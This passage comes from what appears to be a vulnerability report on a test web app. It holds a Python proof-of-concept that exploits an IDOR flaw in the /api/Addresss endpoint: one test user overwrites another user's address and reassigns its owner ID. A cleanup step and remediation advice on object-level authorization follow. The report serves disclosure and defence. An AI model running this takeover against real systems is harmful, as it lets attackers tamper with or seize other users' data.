│  users)                                                                      │
│      user_a = ("idor1@test.local", "Password123!")  # attacker               │
│      user_b = ("idor2@test.local", "Password123!")  # victim/owner           │
│                                                                              │
│      token_a, _ = login(*user_a)                                             │
│      token_b, _ = login(*user_b)                                             │
│                                                                              │
│      # Step 1: User B creates an address                                     │
│      create_body = {                                                         │
│          "fullName": "User Two Addr (IDOR test)",                            │
│          "mobileNum": "5552223333",                                          │
│          "zipCode": "22222",                                                 │
│          "streetAddress": "2 IDOR Street",                                   │
│          "city": "Testville",                                                │
│          "state": "TS",                                                      │
│          "country": "US",                                                    │
│      }                                                                       │
│      r_create = api("POST", "/api/Addresss/", token_b, create_body)          │
│      print("Create status:", r_create.status_code)                           │
│      print("Create body:", r_create.text)                                    │
│      r_create.raise_for_status()                                             │
│      addr_id = r_create.json()["data"]["id"]                                 │
│                                                                              │
│      # Step 2: User A takes over User B's address by ID and reassigns        │
│  UserId                                                                      │
│      takeover_body = {                                                       │
│          "fullName": "TAKEN OVER",                                           │
│          "mobileNum": 9999999999,                                            │
│          "zipCode": "99999",                                                 │
│          "streetAddress": "Hacked",                                          │
│          "city": "Nowhere",                                                  │
│          "state": "NA",                                                      │
│          "country": "US",                                                    │
│          "UserId": 28,  # user A id in this test environment; adjust if      │
│  different                                                                   │
│      }                                                                       │
│      r_takeover = api("PUT", f"/api/Addresss/{addr_id}", token_a,            │
│  takeover_body)                                                              │
│      print("Takeover status:", r_takeover.status_code)                       │
│      print("Takeover body:", r_takeover.text)                                │
│      r_takeover.raise_for_status()                                           │
│                                                                              │
│      # Step 3: Verify via listing                                            │
│      r_list_a = api("GET", "/api/Addresss", token_a)                         │
│      r_list_b = api("GET", "/api/Addresss", token_b)                         │
│      print("User A address list:", r_list_a.status_code, r_list_a.text)      │
│      print("User B address list:", r_list_b.status_code, r_list_b.text)      │
│                                                                              │
│      # Step 4 (Cleanup): restore to user B (reassign UserId back)            │
│      restore_body = dict(create_body)                                        │
│      restore_body["UserId"] = 29  # user B id in this test environment;      │
│  adjust if different                                                         │
│      r_restore = api("PUT", f"/api/Addresss/{addr_id}", token_b,             │
│  restore_body)                                                               │
│      print("Restore status:", r_restore.status_code)                         │
│      print("Restore body:", r_restore.text)                                  │
│                                                                              │
│      return 0                                                                │
│                                                                              │
│                                                                              │
│  if __name__ == "__main__":                                                  │
│      raise SystemExit(main())                                                │
│                                                                              │
│  Remediation                                                                 │
│  Enforce object-level authorization on all address operations:               │
│  - For PUT/PATCH/DELETE on /api/Addresss/{id}, verify the address belongs    │
│  to the authenticated user (or the caller has an explicit administrative     │
│  role) before performing any action.                                         │
│  - Implement server-side allowlisting of writable fields for address         │
│  updates and ignore/strip ownership fields such as UserId from client        │
│  requests.                                                                   │
│  - Add authorization regression tests to prevent cross-user access across    │
│  all ID-based endpoints.                                                     │
│  - Consider using non-guessable identifiers only as a defense-in-depth       │
│  measure; do not rely on identifier opacity in place of authorization.       │
│                                                                              │
